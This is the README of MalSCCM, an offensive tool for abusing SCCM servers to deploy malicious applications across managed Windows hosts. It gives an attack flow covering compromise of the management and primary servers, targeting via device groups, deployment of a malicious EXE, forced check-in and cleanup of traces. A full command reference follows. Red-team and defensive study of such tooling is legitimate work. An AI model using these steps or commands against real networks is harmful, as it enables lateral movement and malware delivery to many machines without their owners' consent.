# MalSCCM

This tool allows you to abuse local or remote SCCM servers to deploy malicious applications to hosts they manage. To use this tool your current process must have admin rights over the SCCM server.

Typically deployments of SCCM will either have the management server and the primary server on the same host, in which case the host returned from the locate command can be used as the primary server.

If that is not the case you will need to compromise the management host returned with locate so that you can then run locate again on that host and get the primary server hostname. Once you have that and admin access you are good to go! 

# Blog

For more information on usage of the tool, refer to the blog below.

* https://labs.nettitude.com/blog/introducing-malsccm/

# Credits 

Massive credit to PowerSCCM (https://github.com/PowerShellMafia/PowerSCCM) which this is all based off, this would not have been done without the work of @harmj0y, @jaredcatkinson, @enigma0x3, @mattifestation. 

# Attack Flow 

* Compromise client, use locate to find management server 
* Compromise management server, use locate to find primary server
* use Inspect on primary server to view who you can target
* Create a new device group for the machines you want to laterally move too
* Add your targets into the new group 
* Create an application pointing to a malicious EXE on a world readable share 
* Deploy the application to the target group 
* Force the target group to checkin for updates 
* Profit...
* Cleanup the application and deployment
* Delete the group

# Help menu 

```
Commands listed below have optional parameters in <>. 

Attempt to find the SCCM management and primary servers:
    MalSCCM.exe locate

Inspect the primary server to gather SCCM information:
    MalSCCM.exe inspect </server:PrimarySiteHostname> </all /computers /deployments /groups /applications /forest /packages /primaryusers>

Create/Modify/Delete Groups to add targets in for deploying malicious apps. Groups can either be for devices or users:
    MalSCCM.exe group /create /groupname:example /grouptype:[user|device] </server:PrimarySiteHostname>
    MalSCCM.exe group /delete /groupname:example </server:PrimarySiteHostname>
    MalSCCM.exe group /addhost /groupname:example /host:examplehost </server:PrimarySiteHostname>
    MalSCCM.exe group /adduser /groupname:example /user:exampleuser </server:PrimarySiteHostname>

Create/Deploy/Delete malicious applications:
    MalSCCM.exe app /create /name:appname /uncpath:""\\unc\path"" </server:PrimarySiteHostname>
    MalSCCM.exe app /delete /name:appname </server:PrimarySiteHostname>
    MalSCCM.exe app /deploy /name:appname /groupname:example /assignmentname:example2 </server:PrimarySiteHostname>
    MalSCCM.exe app /deletedeploy /name:appname </server:PrimarySiteHostname>
    MalSCCM.exe app /cleanup /name:appname </server:PrimarySiteHostname>

Force devices of a group to checkin within a couple minutes:
    MalSCCM.exe checkin /groupname:example </server:PrimarySiteHostname>
```